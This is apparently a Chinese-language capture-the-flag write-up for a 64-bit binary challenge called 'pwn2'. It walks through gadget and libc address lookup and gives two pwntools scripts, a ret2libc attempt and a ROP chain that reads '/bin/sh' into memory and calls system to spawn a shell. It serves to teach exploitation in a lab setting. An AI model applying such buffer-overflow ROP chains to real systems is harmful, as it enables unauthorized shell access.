一樣有 magic 函式，裡面變成`system('/bin/ls')`
但是我們想要的是 /bin/sh

binary中沒有 /bin/sh 可以去 .so 裡面找

![](https://i.imgur.com/1VAqHx9.png)

透過 ldd 發現是用 libc.so.6 (題目有給)

題目檔案是 64-bit
> pwn2: ELF 64-bit LSB executable, x86-64

可以利用 ret2libc 手法 搜集 pop_rdi_ret, binsh_addr, system_addr

![](https://i.imgur.com/bN75qUA.png)

> pop_rdi_ret 0x00000000004006d3

![](https://i.imgur.com/sKcGyCc.png)

> system_libc_addr 0x7ffff7a52390

> binsh_libc_addr 0x7ffff7b99d57


```python
from pwn import *
#p = remote('10.140.0.8', 11112)
p = process('./pwn2')
offset = 'a' * 16
target_addr = 0x04005f7
prr = p64(0x00000000004006d3)
binsh = p64(0x7ffff7b99d57)
system = p64(0x7ffff7a52390)

payload = offset + prr + binsh + system
p.sendline(payload)
p.interactive()
```


比賽時在local測試一直不行，找不出原因(ubuntu18.04)。
後來用16.04才發現local可以，但是也無法連到遠端測試了

---

ret2libc 行不通，因為不知道遠 libc 位置 ， 直接串 ROP即可

```python
from pwn import *

r = process("./pwn2")
elf = ELF('./pwn2')
context(arch='amd64')

offset = 'a'*16
pop_rsi_r15_ret = 0x4006d1
pop_rdi_ret = 0x4006d3

buf = 0x601100
print 'read@plt', hex(elf.plt['read'])
print 'system@plt', hex(elf.plt['system'])
payload = flat([
                offset,
                pop_rdi_ret,
                0,
                pop_rsi_r15_ret,
                buf,
                'a' * 8,
                elf.plt['read'],
                pop_rdi_ret,
                buf,
                elf.plt['system']
                ])
r.sendline(payload)
r.sendline("/bin/sh")
r.interactive()

```
